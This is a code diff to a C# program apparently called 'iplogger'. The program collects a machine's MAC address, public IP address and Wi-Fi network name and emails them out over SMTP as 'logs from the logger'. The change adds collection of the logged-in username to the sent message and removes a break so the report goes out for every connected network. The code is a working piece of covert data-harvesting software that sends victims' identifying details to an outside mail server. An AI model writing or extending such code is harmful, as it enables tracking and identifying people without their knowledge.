@@ -14,6 +14,7 @@ namespace iplogger
             foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
             {
                 string sConnected;
+                string user = Environment.UserName;
                 var networks = NetworkListManager.GetNetworks(NetworkConnectivityLevels.Connected);
                 foreach (var network in networks)
                 {
@@ -39,12 +40,11 @@ namespace iplogger
                     {
                         Subject = "logs from the logger"
                         ,
-                        Body = $"Mac Address: {mac} Ip Address: {publicip} Connected wifi ssid: {network.Name}"
+                        Body = $"Mac Address: {mac} Ip Address: {publicip} Connected wifi ssid: {network.Name} Username: {user} "
                     })
                     {
                         smtp.Send(message);
                     }
-                    break;
                 }
                 break;
             }
